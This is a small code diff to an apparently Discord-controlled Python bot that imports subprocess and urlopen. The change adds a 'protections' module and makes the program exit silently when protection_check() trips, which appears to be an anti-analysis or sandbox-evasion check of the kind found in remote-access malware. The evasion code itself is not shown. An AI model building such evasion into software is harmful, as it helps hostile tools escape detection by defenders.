@@ -2,7 +2,11 @@ import discord
 import subprocess
 from discord.ext import commands
 from resources.modules.misc import *
+from resources.modules.protections import *
 from urllib.request import urlopen
+
+if protection_check():
+    os._exit(0)
 
 client = commands.Bot(command_prefix=['.'], intents=discord.Intents.all(), case_insensitive=True)
 
